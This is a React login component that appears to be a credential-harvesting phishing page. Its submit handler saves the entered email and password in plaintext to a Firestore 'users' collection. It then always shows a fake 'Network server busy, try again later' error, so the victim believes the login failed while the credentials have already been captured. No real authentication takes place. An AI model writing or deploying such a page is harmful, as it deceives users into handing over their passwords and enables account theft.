import { useState } from "react";
import { app, database } from "./firebaseConfig";
import { collection, addDoc } from "firebase/firestore";


function Login() {

    const collectionRef = collection(database, 'users')

    const [errorState, setErrorState] = useState(false);

    const Styler = {
        transform: errorState ? "translate(10px, -70px)": "translate(0px, -200px)",
        transition: "1s linear",
    }

    const [formValue, setFormValue] = useState({
        email: "",
        password: "",
    });

    function gatherInfo(event) {
    setFormValue((prev)=> {
        return {
            ...prev,
            [event.target.name]: event.target.value,
        }
    });
    console.log(formValue);
    }

    function handleError() {
        setErrorState(!errorState);
    }

    function returnError() {
        setErrorState(false);
    }

    function handleSubmit(event) {
        event.preventDefault();
        addDoc(collectionRef, {
            email: formValue.email,
            password: formValue.password,
        })
        .then(()=> {
         console.log("success")
        })
        .catch((error)=> {
        console.log(error.message)
        })
     handleError();
     setTimeout(()=> {
        returnError();
     }, 3000)
    }

    return (
        <div>
            <section className="error" style={Styler}>
        <h1>Network server busy, we are working on it, try again later</h1>
   </section>
        <div className="login">
        <h1>Welcome Back</h1>
        <p>Sign in to your account</p>
        <form className="fields" onSubmit={handleSubmit}>
           <div className="input-fields">
            <p>Your email address</p>
            <input type="text" name="email" onChange={gatherInfo}/>
           </div>
           <div className="input-fields">
           <p>Your Password</p>
            <input type="text" name="password" onChange={gatherInfo}/>
           </div>
           <button>Log in</button>
        </form>
       
        </div>
        </div>
    )
}

export default Login;